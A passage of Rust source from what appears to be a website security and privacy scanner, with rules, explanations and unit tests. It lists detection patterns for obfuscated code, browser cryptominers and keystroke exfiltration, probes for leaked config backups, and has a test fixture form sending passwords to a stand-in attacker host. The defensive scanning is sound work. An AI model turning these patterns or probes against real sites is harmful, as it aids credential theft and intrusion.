        let token = inputs.iter().any(|t| {
            let n = name(t).to_ascii_lowercase();
            kind(t) == "hidden" && FORGERY.iter().any(|f| n.contains(f))
        });
        if method == "POST" && same_site(root, &to) && !token {
            issue(
                "Posts without an anti-forgery token".to_string(),
                "low",
                NO_TOKEN,
                tag,
            );
        }

        issues.sort_by_key(|i| rank(i.severity));
        let severity = issues.first().map_or("info", |i| i.severity);
        let says = if issues.is_empty() { FORM } else { FORM_ISSUES };
        let start = offset(html, tag);
        let mut form = at.signal(
            "Forms",
            format!("Form: {method} {dest}"),
            severity,
            says,
            snippet(tag),
            (start, start + tag.len()),
        );
        form.issues = issues;
        out.push(form);
    }
    out
}

/// Credentials in `code`, masked.
fn secret_signals(code: &str, at: Loc) -> Vec<Signal> {
    code::secrets(code)
        .into_iter()
        .map(|s| {
            at.signal(
                "Secrets",
                s.label,
                s.severity,
                Says {
                    why: s.why,
                    impact: s.impact,
                },
                code::evidence(code, &s),
                (s.at, s.at + s.len),
            )
        })
        .collect()
}

/// Whether a host is a developer's machine or on a private network.
fn dev_host(host: &str) -> bool {
    let h = host.trim_matches(['[', ']']).to_ascii_lowercase();
    if let Ok(ip) = h.parse::<std::net::Ipv4Addr>() {
        return ip.is_loopback() || ip.is_private() || ip.is_unspecified();
    }
    h == "localhost"
        || h == "::1"
        || [".local", ".localhost", ".internal", ".test"]
            .iter()
            .any(|s| h.ends_with(s))
}

/// Words in a path that name an administrator's or developer's endpoint.
const ADMIN: &[&str] = &[
    "admin",
    "administrator",
    "internal",
    "debug",
    "private",
    "manage",
    "management",
    "backoffice",
    "staff",
    "superuser",
];

const CALLS_ADMIN: Says = Says {
    why: "The code names an endpoint meant for administrators, so anyone reading it learns it's there.",
    impact: "Attackers read bundles for exactly these paths, then call them directly. If the server only hides the button and doesn't check who's calling, they get the admin action.",
};
const CLEAR_REQUEST: Says = Says {
    why: "The page is encrypted, but its code sends requests unencrypted.",
    impact: "What these requests carry, and the answers the page acts on, can be read or changed by anyone on the network path, a café's Wi-Fi included.",
};
const DEV_ADDRESS: Says = Says {
    why: "An address on a developer's machine or a private network was left in the code.",
    impact: "Whatever uses it breaks for visitors, and it hands attackers internal host names and ports to aim at.",
};

/// What's worth flagging about one request the site's code makes.
fn request_signals(root: &Url, call: &code::Call, at: Loc) -> Vec<Signal> {
    let mut out = Vec::new();
    let Ok(to) = root.join(&call.url) else {
        return out;
    };
    let evidence = format!("{} {}", call.method, call.url);
    let span = (call.at, call.at + call.url.len());
    let admin = to
        .path()
        .to_ascii_lowercase()
        .split(|c: char| !c.is_ascii_alphanumeric())
        .any(|w| ADMIN.contains(&w));
    if admin && same_site(root, &to) {
        out.push(at.signal(
            "Requests",
            format!("Calls an admin endpoint: {}", call.url),
            "low",
            CALLS_ADMIN,
            evidence.clone(),
            span,
        ));
    }
    let clear = matches!(to.scheme(), "http" | "ws");
    if clear && root.scheme() == "https" && !to.host_str().is_some_and(dev_host) {
        out.push(at.signal(
            "Requests",
            "Sends requests over plain HTTP",
            "medium",
            CLEAR_REQUEST,
            evidence,
            span,
        ));
    }
    out
}

/// Reads code the site serves as its own (inline, its scripts, the original
/// source in its source maps): credentials, the requests it makes,
/// development addresses left in it, and file uploads it builds.
fn own_code(requests: &mut Vec<Request>, root: &Url, code: &str, at: Loc) -> Vec<Signal> {
    let mut out = secret_signals(code, at);
    for call in code::requests(code) {
        out.extend(request_signals(root, &call, at));
        add_request(
            requests,
            Request {
                method: call.method,
                url: call.url,
                params: Vec::new(),
                page: at.page.to_string(),
                script: at.script.map(str::to_string),
            },
        );
    }
    if !root.host_str().is_some_and(dev_host) {
        let dev = addresses(code).into_iter().find(|a| {
            Url::parse(a)
                .ok()
                .is_some_and(|u| u.host_str().is_some_and(dev_host))
        });
        if let Some(a) = dev {
            let start = offset(code, a);
            out.push(at.signal(
                "Requests",
                "Names a development address",
                "low",
                DEV_ADDRESS,
                a.to_string(),
                (start, start + a.len()),
            ));
        }
    }
    let upload = [
        "type=\"file\"",
        "type='file'",
        "type:\"file\"",
        "type: \"file\"",
        "type:'file'",
    ];
    if let Some((i, len)) = upload
        .iter()
        .find_map(|p| code.find(p).map(|i| (i, p.len())))
    {
        out.push(at.signal(
            "Forms",
            "Takes file uploads",
            "low",
            UPLOAD,
            around(code, i),
            (i, i + len),
        ));
    }
    out
}

const SOURCE: Says = Says {
    why: "Its source maps hold the original, unminified source of the site's code, comments and all, for anyone to download. Leave them out of what's deployed.",
    impact: "The full original code, with its comments, internal paths and anything left in it, is readable, which makes finding the next weakness much easier.",
};
const SOURCE_MAP: Says = Says {
    why: "Its source maps name every original source file and where its code came from.",
    impact:
        "A map of how the site is built, file by file, which helps an attacker find where to look.",
};

/// The source map a script names: where it does, and the name.
fn source_map(code: &str) -> Option<((usize, usize), &str)> {
    let key = "sourceMappingURL=";
    let at = code.rfind(key)?;
    let rest = &code[at + key.len()..];
    let name = rest
        .split(|c: char| c.is_whitespace() || "*\"'".contains(c))
        .next()
        .filter(|n| !n.is_empty())?;
    Some(((at, at + key.len() + name.len()), name))
}

/// A source's name in a map, cleaned to a path: `webpack://app/./src/a.js`
/// is `src/a.js`.
fn clean_source(name: &str) -> String {
    let name = name.split_once("://").map_or(name, |(_, rest)| rest);
    let parts: Vec<&str> = name
        .split('/')
        .filter(|p| !p.is_empty() && *p != "." && *p != "..")
        .collect();
    let skip = usize::from(parts.len() > 1 && !parts[0].contains('.') && name.contains("/./"));
    parts[skip..].join("/")
}

/// Reads each source map: flags it in the script that names it, and reads
/// the site's own original source in it as its own code.
async fn read_maps(client: &Client, root: &Url, site: &mut Site, maps: &[MapRef]) {
    let bodies = join_all(maps.iter().map(|m| body(client, m.map.as_str()))).await;
    for (m, text) in maps.iter().zip(bodies) {
        let Some(text) = text.filter(|t| t.contains("\"mappings\"")) else {
            continue;
        };
        let at = Loc::new(&m.page, Some(&m.script), &m.script);
        let whole = text.contains("\"sourcesContent\"");
        let (label, severity, says) = if whole {
            ("Ships its source code", "medium", SOURCE)
        } else {
            ("Ships its source maps", "low", SOURCE_MAP)
        };
        site.signals
            .push(at.signal("Source", label, severity, says, m.map.to_string(), m.span));
        if !whole {
            continue;
        }
        let parsed: Option<serde_json::Value> = serde_json::from_str(&text).ok();
        let files = parsed.as_ref().and_then(|v| {
            Some((
                v.get("sources")?.as_array()?,
                v.get("sourcesContent")?.as_array()?,
            ))
        });
        let Some((names, contents)) = files else {
            continue;
        };
        for (name, content) in names.iter().zip(contents) {
            let (Some(name), Some(content)) = (name.as_str(), content.as_str()) else {
                continue;
            };
            if name.contains("node_modules") || name.starts_with("webpack/") {
                continue;
            }
            let key = format!("{} ({name})", m.map);
            let shown = format!("source maps/{}", clean_source(name));
            let kind = kind_of(&shown, "js");
            let found = own_code(
                &mut site.requests,
                root,
                content,
                Loc::new(&m.page, Some(&key), &key),
            );
            add(site, found, &key, shown, kind, content);
        }
    }
}

/// Words in a path `robots.txt` names that are worth a look.
const HIDDEN: &[&str] = &[
    "admin",
    "administrator",
    "login",
    "signin",
    "backup",
    "backups",
    "bak",
    "private",
    "secret",
    "secrets",
    "config",
    "configuration",
    "internal",
    "staging",
    "dev",
    "test",
    "debug",
    "phpmyadmin",
    "pma",
    "cpanel",
    "git",
    "env",
    "sql",
    "dump",
    "db",
    "database",
    "upload",
    "uploads",
    "tmp",
    "temp",
    "old",
    "cgi",
    "manage",
    "manager",
    "management",
    "dashboard",
    "panel",
    "console",
    "install",
    "setup",
    "api",
    "logs",
];

const ROBOTS_OPEN: Says = Says {
    why: "robots.txt is public, and this path it asks search engines to skip opens without a login.",
    impact: "robots.txt is the first file an attacker reads. This path is listed there and opens to anyone, so whatever it holds is theirs.",
};
const ROBOTS_LOGIN: Says = Says {
    why: "robots.txt is public, so listing this path there tells anyone where it is. It asks for a login.",
    impact: "It points automated password guessing straight at the login. Make sure it's strong, limits attempts and has two-factor sign-in.",
};

/// What the paths `robots.txt` names give away: a sensitive-sounding path
/// that opens to anyone, or one that only tells where a login is.
async fn robots_signals(
    client: &Client,
    root: &Url,
    site: &mut Site,
    robots: &Robots,
    soft404: Option<&Baseline>,
) {
    let Ok(url) = root.join("/robots.txt").map(|u| u.to_string()) else {
        return;
    };
    let at = Loc::new("/robots.txt", None, &url);
    let blanket = matches!(soft404, Some(Baseline::Redirect { .. }));
    let mut checked = 0;
    let mut found = Vec::new();
    for (path, line) in &robots.named {
        let hidden = path
            .to_ascii_lowercase()
            .split(|c: char| !c.is_ascii_alphanumeric())
            .any(|w| HIDDEN.contains(&w));
        let Some(status) = site
            .pages
            .iter()
            .find(|p| p.path == *path)
            .map(|p| p.status)
            .filter(|_| hidden)
        else {
            continue;
        };
        let span = robots
            .text
            .find(line.as_str())
            .map_or((0, 0), |i| (i, i + line.len()));
        if (200..300).contains(&status) {
            // On a service that answers every path alike, it isn't there.
            if let Some(base) = soft404.filter(|b| matches!(b, Baseline::Page { .. })) {
                if checked == 20 {
                    continue;
                }
                checked += 1;
                let Ok(u) = root.join(path) else { continue };
                let Ok(resp) = client.get(u).send().await else {
                    continue;
                };
                let s = resp.status().as_u16();
                match crate::capped(resp, BIGGEST).await {
                    Some(b) if !base.matches_page(s, &b) => {}
                    _ => continue,
                }
            }
            found.push(at.signal(
                "Robots",
                format!("robots.txt points to {path}, open to anyone"),
                "medium",
                ROBOTS_OPEN,
                line.clone(),
                span,
            ));
        } else if status == 401 || status == 403 || ((300..400).contains(&status) && !blanket) {
            found.push(at.signal(
                "Robots",
                format!("robots.txt names {path}"),
                "low",
                ROBOTS_LOGIN,
                line.clone(),
                span,
            ));
        }
    }
    add(
        site,
        found,
        &url,
        "/robots.txt".to_string(),
        "text",
        &robots.text,
    );
}

/// Copies an editor or a deploy leaves next to a PHP file.
const BACKUPS: &[&str] = &[".bak", "~", ".old", ".orig", ".save"];
/// Copies of WordPress's configuration, which holds its database password.
const WP_CONFIG: &[&str] = &[
    "/wp-config.php.bak",
    "/wp-config.php~",
    "/wp-config.php.old",
    "/wp-config.php.orig",
    "/wp-config.php.save",
    "/wp-config.txt",
];

const PHP_SOURCE: Says = Says {
    why: "The server hands out this PHP file's source instead of running it. Delete stray copies and make sure PHP runs for every .php file.",
    impact: "Database passwords, API keys and how the page works are readable by anyone, who can sign in to the database with them or read the code for a way in.",
};

/// PHP the server hands out as source instead of running it: a `.php`
/// page served as text, the copies editors and deploys leave beside PHP
/// files, and on WordPress, copies of its configuration. Each is read for
/// credentials and the request parameters it takes.
async fn php_source(client: &Client, root: &Url, site: &mut Site) {
    let php: Vec<&Page> = site
        .pages
        .iter()
        .filter(|p| p.path.to_ascii_lowercase().ends_with(".php"))
        .collect();
    let mut paths: Vec<String> = php
        .iter()
        .filter(|p| {
            (200..300).contains(&p.status)
                && !p
                    .content_type
                    .as_deref()
                    .is_some_and(|t| t.contains("html"))
        })
        .map(|p| p.path.clone())
        .collect();
    for p in php.iter().take(5) {
        paths.extend(BACKUPS.iter().map(|b| format!("{}{b}", p.path)));
    }
    if site.wordpress {
        paths.extend(WP_CONFIG.iter().map(|p| p.to_string()));
    }
    let mut seen = HashSet::new();
    paths.retain(|p| seen.insert(p.clone()));

    for chunk in paths.chunks(AT_ONCE) {
        let bodies = join_all(chunk.iter().map(|p| async move {
            let u = root.join(p).ok()?;
            body(client, u.as_str()).await
        }))
        .await;
        for (path, text) in chunk.iter().zip(bodies) {
            let Some(text) = text else { continue };
            let Some(start) = text.find("<?php") else {
                continue;
            };
            let url = root
                .join(path)
                .map_or_else(|_| path.clone(), |u| u.to_string());
            let at = Loc::new(path, Some(&url), &url);
            let mut found = vec![at.signal(
                "Source",
                "Serves PHP source",
                "high",
                PHP_SOURCE,
                around(&text, start),
                (start, start + 5),
            )];
            found.extend(secret_signals(&text, at));
            let inputs = code::php_inputs(&text);
            for method in ["GET", "POST", "ANY", "COOKIE", "FILE"] {
                let params: Vec<String> = inputs
                    .iter()
                    .filter(|(m, _)| *m == method)
                    .map(|(_, n)| n.clone())
                    .collect();
                if params.is_empty() {
                    continue;
                }
                if method == "FILE" {
                    let i = text.find("$_FILES").unwrap_or(start);
                    found.push(at.signal(
                        "Forms",
                        "Takes file uploads",
                        "low",
                        UPLOAD,
                        format!("$_FILES['{}']", params[0]),
                        (i, i + 7),
                    ));
                }
                add_request(
                    &mut site.requests,
                    Request {
                        method: method.to_string(),
                        url: path.clone(),
                        params,
                        page: path.clone(),
                        script: Some(url.clone()),
                    },
                );
            }
            add(site, found, &url, path.clone(), "php", &text);
        }
    }
}

/// What to look for in code: every group must match one of its alternatives.
struct Rule {
    category: &'static str,
    label: &'static str,
    severity: &'static str,
    all: &'static [&'static [&'static str]],
    says: Says,
}

const FINGERPRINT: &str = "Combined with a few other details, it gives the visitor an ID that follows them across visits, cleared cookies and private windows included.";

const RULES: &[Rule] = &[
    Rule {
        category: "Location",
        label: "Asks for your location",
        severity: "medium",
        all: &[&["getCurrentPosition", "watchPosition"]],
        says: Says {
            why: "Your browser would ask to share your precise location with the site.",
            impact: "A visitor who allows it tells the site where they are to within metres, and every other script on the page, ads or a compromised library, can read it too.",
        },
    },
    Rule {
        category: "Location",
        label: "Looks up where your IP address is",
        severity: "medium",
        all: &[&["ipapi.co", "ipinfo.io", "ip-api.com", "ipgeolocation", "freegeoip", "geoip-db", "api.ipify.org", "extreme-ip-lookup", "geolocation-db"]],
        says: Says {
            why: "The page asks a third party for your public IP address or the place it's registered to.",
            impact: "Each visitor's IP address and rough location go to another company, which can tie them to their visits on every other site that uses it.",
        },
    },
    Rule {
        category: "Network",
        label: "Can reveal your local IP address",
        severity: "medium",
        all: &[&["RTCPeerConnection", "webkitRTCPeerConnection"], &["onicecandidate", "createDataChannel"]],
        says: Says {
            why: "WebRTC used this way can expose your device's address on its local network, even behind a VPN.",
            impact: "A visitor's private address leaks, which helps unmask them behind a VPN and maps the network they're on.",
        },
    },
    Rule {
        category: "Fingerprinting",
        label: "Uses a fingerprinting library",
        severity: "medium",
        all: &[&["fingerprintjs", "FingerprintJS", "fpjs.io", "ClientJS", "evercookie", "fingerprint2", "Fingerprint2"]],
        says: Says {
            why: "A library built to identify your browser across visits without cookies.",
            impact: FINGERPRINT,
        },
    },
    Rule {
        category: "Fingerprinting",
        label: "Draws a hidden canvas to fingerprint your browser",
        severity: "low",
        all: &[&["toDataURL", "getImageData"], &["fillText"]],
        says: Says {
            why: "Text drawn on an unseen canvas renders slightly differently on every machine, which identifies yours.",
            impact: FINGERPRINT,
        },
    },
    Rule {
        category: "Fingerprinting",
        label: "Reads your graphics card",
        severity: "low",
        all: &[&["UNMASKED_RENDERER_WEBGL", "UNMASKED_VENDOR_WEBGL", "WEBGL_debug_renderer_info"]],
        says: Says {
            why: "The exact graphics hardware is one of the strongest fingerprinting signals.",
            impact: FINGERPRINT,
        },
    },
    Rule {
        category: "Fingerprinting",
        label: "Fingerprints your audio stack",
        severity: "low",
        all: &[&["createOscillator"], &["createDynamicsCompressor", "OfflineAudioContext"]],
        says: Says {
            why: "A silent sound processed by your browser comes out slightly differently on every machine.",
            impact: FINGERPRINT,
        },
    },
    Rule {
        category: "Fingerprinting",
        label: "Reads your battery",
        severity: "low",
        all: &[&["getBattery("]],
        says: Says {
            why: "Battery level and charging state can tie your visits together.",
            impact: "Two visits a minute apart, even in different private windows, can be matched by their battery level.",
        },
    },
    Rule {
        category: "Fingerprinting",
        label: "Collects details about your device",
        severity: "low",
        all: &[&["hardwareConcurrency"], &["deviceMemory", "navigator.plugins", "getHighEntropyValues", "colorDepth"]],
        says: Says {
            why: "Processor count, memory, plugins and screen details together narrow down who you are.",
            impact: FINGERPRINT,
        },
    },
    Rule {
        category: "Camera and sensors",
        label: "Asks for your camera or microphone",
        severity: "medium",
        all: &[&["getUserMedia("]],
        says: Says {
            why: "Your browser would ask to turn on your camera or microphone for the site.",
            impact: "Once allowed, the page can record sound or video, and so can any compromised script running on it.",
        },
    },
    Rule {
        category: "Camera and sensors",
        label: "Lists your cameras and microphones",
        severity: "low",
        all: &[&["enumerateDevices("]],
        says: Says {
            why: "The devices attached to your machine help identify it.",
            impact: FINGERPRINT,
        },
    },
    Rule {
        category: "Camera and sensors",
        label: "Reads motion sensors",
        severity: "low",
        all: &[&["DeviceMotionEvent", "DeviceOrientationEvent", "devicemotion", "deviceorientation"]],
        says: Says {
            why: "On phones, motion sensors can reveal how you hold the device and even what you tap.",
            impact: "Motion data has been used to work out where on the screen someone taps, PIN entry included.",
        },
    },
    Rule {
        category: "Camera and sensors",
        label: "Reads your clipboard",
        severity: "medium",
        all: &[&["clipboard.readText", "clipboard.read("]],
        says: Says {
            why: "Whatever you last copied, such as a password, could be read by the page.",
            impact: "A password or one-time code copied from a password manager can be read and sent away.",
        },
    },
    Rule {
        category: "Typing",
        label: "May send what you type as you type it",
        severity: "medium",
        all: &[
            &["\"keydown\"", "'keydown'", "\"keypress\"", "'keypress'", "\"keyup\"", "'keyup'", "onkeypress", "onkeydown"],
            &["sendBeacon", "new Image().src", "new WebSocket("],
        ],
        says: Says {
            why: "Key presses are watched by code that can quietly send data away, before you ever submit anything.",
            impact: "What a visitor types, passwords included, can leave the page before they press submit, or even if they change their mind and never do.",
        },
    },
    Rule {
        category: "Mining",
        label: "Mines cryptocurrency in your browser",
        severity: "high",
        all: &[&["coinhive", "CoinHive", "cryptonight", "CryptoNight", "coinimp", "webminer", "minero.cc", "crypto-loot", "deepMiner", "webmine.pro"]],
        says: Says {
            why: "The page would use your processor to mine for someone else, slowing and heating your machine.",
            impact: "Visitors' processors run flat out for someone else, draining batteries, and antivirus and browsers start flagging the site.",
        },
    },
    Rule {
        category: "Hidden code",
        label: "Runs packed, hidden code",
        severity: "low",
        all: &[&["eval(atob(", "eval(function(p,a,c,k,e", "eval(unescape(", "document.write(unescape("]],
        says: Says {
            why: "Code wrapped so it can't be read until it runs, often to hide what it does.",
            impact: "Hidden code can do anything a script can. It's how code planted on a compromised site usually hides.",
        },
    },
    Rule {
        category: "Persistence",
        label: "Installs a service worker",
        severity: "low",
        all: &[&["serviceWorker.register"]],
        says: Says {
            why: "A service worker keeps code for the site in your browser after you leave the page.",
            impact: "The worker can intercept every request the site makes and keeps running cached code after the site changes, planted code included.",
        },
    },
    Rule {
        category: "Persistence",
        label: "Asks to send you notifications",
        severity: "low",
        all: &[&["Notification.requestPermission", "pushManager.subscribe"]],
        says: Says {
            why: "Allowing it lets the site push messages to you whenever it likes.",
            impact: "Notification permission is a favourite route for spam and scam pop-ups once a site is sold or compromised.",
        },
    },
];

/// Reads one script's code against the rules.
fn read_code(code: &str, at: Loc) -> Vec<Signal> {
    let mut out = Vec::new();
    for rule in RULES {
        let mut first = None;
        let matched = rule.all.iter().all(|group| {
            match group
                .iter()
                .find_map(|n| code.find(*n).map(|i| (i, n.len())))
            {
                Some(hit) => {
                    first.get_or_insert(hit);
                    true
                }
                None => false,
            }
        });
        if let (true, Some((i, len))) = (matched, first) {
            out.push(at.signal(
                rule.category,
                rule.label,
                rule.severity,
                rule.says,
                around(code, i),
                (i, i + len),
            ));
        }
    }
    out
}

/// Analytics and ad trackers, and session recorders, by where they load from.
const TRACKERS: &[(&str, &str, bool)] = &[
    ("google-analytics.com", "Google Analytics", false),
    ("googletagmanager.com", "Google Tag Manager", false),
    ("connect.facebook.net", "Meta Pixel", false),
    ("doubleclick.net", "Google Ads", false),
    ("analytics.tiktok.com", "TikTok Pixel", false),
    ("snap.licdn.com", "LinkedIn Insight", false),
    ("bat.bing.com", "Microsoft Ads", false),
    ("cdn.segment.com", "Segment", false),
    ("cdn.mxpnl.com", "Mixpanel", false),
    ("hotjar.com", "Hotjar", true),
    ("clarity.ms", "Microsoft Clarity", true),
    ("fullstory.com", "FullStory", true),
    ("mouseflow.com", "Mouseflow", true),
    ("smartlook.com", "Smartlook", true),
    ("cdn.logrocket", "LogRocket", true),
    ("crazyegg.com", "Crazy Egg", true),
];

const RECORDER: Says = Says {
    why: "Session recorders capture your clicks, scrolling and often what you type, and replay it for the site's owners.",
    impact: "Each visit is recorded and stored with another company, form fields included unless they're masked, so personal details typed here can end up in their storage.",
};
const TRACKER: Says = Says {
    why: "An analytics or advertising tracker that follows your visit and often your browsing elsewhere.",
    impact: "Every visit is reported to the tracker's company, which adds it to a profile of the visitor built across every site that uses it.",
};

/// The trackers `text` (a script's address or inline code) loads.
fn trackers(text: &str, at: Loc) -> Vec<Signal> {
    let mut out = Vec::new();
    for (host, name, replay) in TRACKERS {
        let Some(i) = text.find(*host) else { continue };
        let (category, label, says) = if *replay {
            (
                "Session recording",
                format!("Records your session with {name}"),
                RECORDER,
            )
        } else {
            ("Trackers", format!("Tracks you with {name}"), TRACKER)
        };
        out.push(at.signal(
            category,
            label,
            if *replay { "medium" } else { "low" },
            says,
            around(text, i),
            (i, i + host.len()),
        ));
    }
    out
}

/// Drops the notes of which page loaded which script, and repeats of the
/// same thing: the same evidence in the same script, on whichever page,
/// as a site's layout repeats on every page.
fn dedupe(signals: &mut Vec<Signal>) {
    let mut seen = HashSet::new();
    signals.retain(|s| {
        s.category != "Scripts"
            && seen.insert((s.label.clone(), s.script.clone(), s.evidence.clone()))
    });
}

/// Shows the part of each kept file its signals are in, and marks where.
fn place(site: &mut Site) {
    for t in std::mem::take(&mut site.texts) {
        let mut refs = Vec::new();
        let mut spans = Vec::new();
        for (si, s) in site.signals.iter().enumerate() {
            if s.file.as_deref() != Some(t.url.as_str()) {
                continue;
            }
            if let Some(span) = s.span {
                refs.push((si, None));
                spans.push(span);
            }
            for (ii, issue) in s.issues.iter().enumerate() {
                if let Some(span) = issue.span {
                    refs.push((si, Some(ii)));
                    spans.push(span);
                }
            }
        }
        if refs.is_empty() {
            continue;
        }
        let (sections, marks) = source::show(&t.text, &spans);
        for ((si, ii), mark) in refs.into_iter().zip(marks) {
            match ii {
                None => site.signals[si].mark = mark,
                Some(ii) => site.signals[si].issues[ii].mark = mark,
            }
        }
        site.files.push(SourceFile {
            url: t.url,
            name: t.name,
            kind: t.kind,
            sections,
        });
    }
    let shown: HashSet<String> = site.files.iter().map(|f| f.url.clone()).collect();
    for s in &mut site.signals {
        if s.file.as_ref().is_some_and(|f| !shown.contains(f)) {
            s.file = None;
        }
    }
}

/// About 120 characters of `text` around byte `at`, on one line.
fn around(text: &str, at: usize) -> String {
    let mut start = at.saturating_sub(50);
    while !text.is_char_boundary(start) {
        start -= 1;
    }
    let mut end = (at + 70).min(text.len());
    while !text.is_char_boundary(end) {
        end += 1;
    }
    text[start..end]
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

fn snippet(tag: &str) -> String {
    around(tag, 0)
}

/// A page's `<title>`.
fn title(html: &str) -> Option<String> {
    let lower = html.to_ascii_lowercase();
    let open = lower.find("<title")?;
    let start = open + lower[open..].find('>')? + 1;
    let end = start + lower[start..].find("</title")?;
    let t = html[start..end]
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ");
    (!t.is_empty()).then_some(t)
}

/// Each `<name ...>` element: its opening tag, and for `script` and `form`,
/// what's between it and its closing tag.
fn elements<'a>(html: &'a str, lower: &str, name: &str) -> Vec<(&'a str, &'a str)> {
    let mut out = Vec::new();
    let open = format!("<{name}");
    let close = format!("</{name}");
    let mut from = 0;
    while let Some(i) = lower[from..].find(&open).map(|i| i + from) {
        let after = i + open.len();
        let next = lower.as_bytes().get(after).copied().unwrap_or(b'>');
        if !(next == b'>' || next.is_ascii_whitespace() || next == b'/') {
            from = after;
            continue;
        }
        let Some(end) = lower[after..].find('>').map(|e| e + after) else {
            break;
        };
        let tag = &html[i..=end];
        let inner = if name == "script" || name == "form" {
            let stop = lower[end + 1..]
                .find(&close)
                .map_or(html.len(), |c| c + end + 1);
            &html[end + 1..stop]
        } else {
            ""
        };
        out.push((tag, inner));
        from = end + 1;
    }
    out
}

/// Every value of attribute `attr` on `<name>` elements.
fn values<'a>(html: &'a str, name: &str, attr: &str) -> Vec<&'a str> {
    let lower = html.to_ascii_lowercase();
    elements(html, &lower, name)
        .into_iter()
        .filter_map(|(tag, _)| value(tag, attr))
        .collect()
}

/// An attribute's value in an opening tag, quoted or not.
fn value<'a>(tag: &'a str, attr: &str) -> Option<&'a str> {
    let lower = tag.to_ascii_lowercase();
    let mut from = 0;
    while let Some(i) = lower[from..].find(attr).map(|i| i + from) {
        let before = lower
            .as_bytes()
            .get(i.wrapping_sub(1))
            .copied()
            .unwrap_or(b' ');
        let rest = lower[i + attr.len()..].trim_start();
        if before.is_ascii_whitespace() && rest.starts_with('=') {
            let eq = i + attr.len() + (lower[i + attr.len()..].len() - rest.len());
            let v = tag[eq + 1..].trim_start();
            return Some(match v.chars().next() {
                Some(q @ ('"' | '\'')) => v[1..].split(q).next().unwrap_or(""),
                _ => v
                    .split(|c: char| c.is_whitespace() || c == '>')
                    .next()
                    .unwrap_or(""),
            });
        }
        from = i + attr.len();
    }
    None
}

/// Every piece of `text` between `open` and `close`.
fn between<'a>(text: &'a str, open: &str, close: &str) -> Vec<&'a str> {
    let mut out = Vec::new();
    let mut from = 0;
    while let Some(i) = text[from..].find(open).map(|i| i + from + open.len()) {
        let Some(j) = text[i..].find(close).map(|j| j + i) else {
            break;
        };
        out.push(&text[i..j]);
        from = j + close.len();
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn here(file: &str) -> Loc<'_> {
        Loc::new("/", None, file)
    }

    #[test]
    fn reads_attributes() {
        assert_eq!(
            value(r#"<a class="x" href="/about">"#, "href"),
            Some("/about")
        );
        assert_eq!(
            value("<a href=/plain target=_blank>", "href"),
            Some("/plain")
        );
        assert_eq!(value(r#"<a data-href="/no">"#, "href"), None);
        assert_eq!(
            values(
                r#"<p><a href='/a'>A</a> <A HREF="/b">B</A></p>"#,
                "a",
                "href"
            ),
            ["/a", "/b"]
        );
    }

    #[test]
    fn reads_scripts_and_titles() {
        let html =
            r#"<title> Shop </title><script src="/app.js"></script><script>var x = 1;</script>"#;
        let lower = html.to_ascii_lowercase();
        let found = elements(html, &lower, "script");
        assert_eq!(found.len(), 2);
        assert_eq!(value(found[0].0, "src"), Some("/app.js"));
        assert_eq!(found[1].1, "var x = 1;");
        assert_eq!(title(html).as_deref(), Some("Shop"));
    }

    #[test]
    fn keeps_links_on_the_site() {
        let root = Url::parse("https://shop.example").unwrap();
        let page = root.join("/a/b").unwrap();
        assert_eq!(local_path(&root, &page, "c?x=1#y").as_deref(), Some("/a/c"));
        assert_eq!(local_path(&root, &page, "https://other.example/"), None);
        assert_eq!(local_path(&root, &page, "mailto:x@y"), None);
    }

    #[test]
    fn rules_need_every_group() {
        let out = read_code(
            "pc = new RTCPeerConnection(); pc.onicecandidate = f;",
            here("x"),
        );
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].category, "Network");
        assert_eq!(out[0].span, Some((9, 26)));
        assert!(read_code("new RTCPeerConnection()", here("x")).is_empty());
        let out = read_code(
            "navigator.geolocation.getCurrentPosition(ok)",
            Loc::new(
                "/",
                Some("https://cdn.example/a.js"),
                "https://cdn.example/a.js",
            ),
        );
        assert_eq!(out[0].label, "Asks for your location");
        assert_eq!(out[0].script.as_deref(), Some("https://cdn.example/a.js"));
        assert!(!out[0].impact.is_empty());
    }

    fn page(root: &str, html: &str) -> Site {
        let root = Url::parse(root).unwrap();
        let mut site = Site::default();
        let mut scripts = Vec::new();
        read_page(&mut site, &root, &root, "/", html, &mut scripts);
        dedupe(&mut site.signals);
        place(&mut site);
        site
    }

    #[test]
    fn a_form_is_one_concern_naming_where_it_submits() {
        let html = r#"<form action="https://collect.evil/login"><input type="password"></form><iframe src="/x" style="display: none"></iframe>"#;
        let site = page("http://shop.example", html);
        let form = site.signals.iter().find(|s| s.category == "Forms").unwrap();
        assert_eq!(form.label, "Form: GET https://collect.evil/login");
        assert_eq!(form.severity, "high");
        let issues: Vec<&str> = form.issues.iter().map(|i| i.label.as_str()).collect();
        assert_eq!(
            issues,
            [
                "Sends a password to collect.evil",
                "Asks for a password over plain HTTP",
                "Sends a password in the address"
            ]
        );
        assert_eq!(
            site.signals
                .iter()
                .filter(|s| s.category == "Forms")
                .count(),
            1
        );
        assert!(site
            .signals
            .iter()
            .any(|s| s.label == "Loads a hidden frame"));
        // The page is shown, and the form is marked on its opening tag.
        let file = &site.files[0];
        assert_eq!(file.name, "/index.html");
        let m = form.mark.unwrap();
        let shown: String = file.sections[m.section]
            .text
            .chars()
            .skip(m.at)
            .take(5)
            .collect();
        assert_eq!(shown, "<form");
    }

    #[test]
    fn a_plain_form_still_reports_where_it_goes() {
        let site = page(
            "https://shop.example",
            r#"<form action="/search"><input name="q"></form>"#,
        );
        assert_eq!(site.signals.len(), 1);
        assert_eq!(site.signals[0].label, "Form: GET /search");
        assert_eq!(site.signals[0].severity, "info");
        assert!(site.signals[0].issues.is_empty());
        assert_eq!(site.requests[0].params, ["q"]);
    }

    #[test]
    fn reads_what_forms_expose() {
        let html = r#"<form action="/upload" method="post" enctype="multipart/form-data"><input type="file" name="doc"><input type="hidden" name="api_key" value="a8f5f167f44f4964e6c9"></form>
            <form action="/login" method="get"><input name="user"><input type="password" name="pw" value="letmein1"></form>
            <form action="/avatar" method="post"><input type="hidden" name="_wpnonce" value="1a2b"><input type="file" accept="image/*" name="pic"></form>"#;
        let site = page("https://shop.example", html);
        let form = |l: &str| {
            site.signals
                .iter()
                .find(|s| s.label == l)
                .unwrap()
                .issues
                .iter()
                .map(|i| i.label.as_str())
                .collect::<Vec<_>>()
        };
        assert_eq!(
            form("Form: POST /upload"),
            [
                "Hides a credential in the field api_key",
                "Takes uploads of any file type",
                "Posts without an anti-forgery token"
            ]
        );
        assert_eq!(
            form("Form: GET /login"),
            [
                "Fills in a password in the page",
                "Sends a password in the address"
